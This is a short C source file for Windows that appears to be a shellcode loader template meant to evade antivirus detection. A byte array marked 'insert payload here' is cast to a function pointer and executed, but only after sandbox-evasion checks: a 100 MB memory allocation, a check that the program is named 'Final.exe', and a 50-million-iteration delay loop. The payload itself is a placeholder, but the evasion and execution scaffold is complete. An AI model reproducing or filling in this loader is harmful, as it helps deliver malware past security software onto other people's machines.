
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib,"ws2_32")

#define memory 100000000
#define counter 50000000

char fluffybunny [] = "insert payload here";

int start(void){

	int (*func)();
	func = (int (*)()) fluffybunny;
	(int)(*func)();

		}

int takeawhile (){

	int tcp = 0;
	int i = 0;
	for (i =0; i < counter; i ++)
		{	
			tcp++;
		}
	if (tcp == counter)
	{

		start();
	}
		return 0;

		}



int main(int argc, char * argv[])
{
	char* memdmp = NULL;
	memdmp = (
	char*) malloc(memory);
	if (memdmp!=NULL)
	{

		memset(memdmp,00, memory);
		if (strstr(argv[0], "Final.exe") >0)
		{
			takeawhile();
			free(memdmp);
		}
	}
	return 0;

	}
